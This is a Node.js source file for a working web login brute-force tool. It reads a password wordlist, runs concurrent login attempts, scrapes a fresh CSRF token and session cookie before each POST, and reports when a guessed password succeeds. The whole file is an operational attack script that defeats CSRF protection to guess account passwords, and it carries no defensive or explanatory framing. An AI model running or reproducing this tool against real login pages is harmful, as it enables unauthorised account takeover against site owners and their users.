var fs      = require('fs');
var es      = require('event-stream');
var async   = require('async');
var request = require('request');

// ================================================================================================
// Public API
// ================================================================================================

function launch(config) {
  var queue = async.queue(tryLogin, config.concurrency);

  queue.drain = function() {
    console.log('[+] Finished');
  };

  console.log('[+] Reading wordlist...');

  fs.createReadStream(config.wordlist)
    .on('error', function() {
      console.log('[-] Error reading file');
    })
    .on('end', function() {
      console.log('[+] Full wordlist read');
    })
    .pipe(es.split())
    .pipe(es.map(function(word) {
        queue.push(word);
      })
    );

  // ==============================================================================================
  // Private 
  // ==============================================================================================

  // Extract CSRF token
  function getCSRF(callback) {
    var reqConfig = config.getAdvanced();

    request(reqConfig.csrf, function (error, response, body) {

      if (!error && response.statusCode === 200) {
        var cookieString = response.headers['set-cookie'][0];
        var capture      = body.match(new RegExp(reqConfig.capture.csrfRegex));

        if (!capture) {
          console.log('[-] CSRF token not found\n[-] Debug info:\n');
          process.exit(1);
        }

        callback(capture[1], cookieString);
      } else {
        console.error(error.toString());
        process.exit(1);
      }
    });
  }

  // Process server response to a login attemot
  function processLoginResponse(response, body, password) {
    
    // If we match known regex (can be multiple) password is incorrect
    var loginFailures = config.getAdvanced().capture.loginRegex;

    if (response.statusCode === 200 && matchAny(loginFailures, body)) { 

      console.log('[-] Invalid: ' + password);

    } else if (response.statusCode < 400) {

      console.log('[+] FOUND: ' + password  + '\n[+] Shutting down....');
      process.exit(1);
    
    } else {
      
      console.log('[-] Server responded with: ' + response.statusCode);

    }
  }

  // Attempt to login with given password
  function tryLogin(password, callback) {

    getCSRF(function(token, cookieString) {
      var opt = config.getLogin(password, token, cookieString);

      // Send a login POST
      request(opt, function (error, response, body) {
        
        if (!error) { 
          processLoginResponse(response, body, password);
        } else {
          console.error(error.toString());
        }
        
        callback();
      });
    });
  }
}

exports.launch = launch;

// ================================================================================================
// Helpers
// ================================================================================================

function matchAny(arrPatterns, sTarget) {
  for (var i = 0; i < arrPatterns.length; i++) {
    
    var re    = new RegExp(arrPatterns[i]);
    var match = sTarget.match(re);

    if (match) {
      return match;
    }
  }

  return null;

}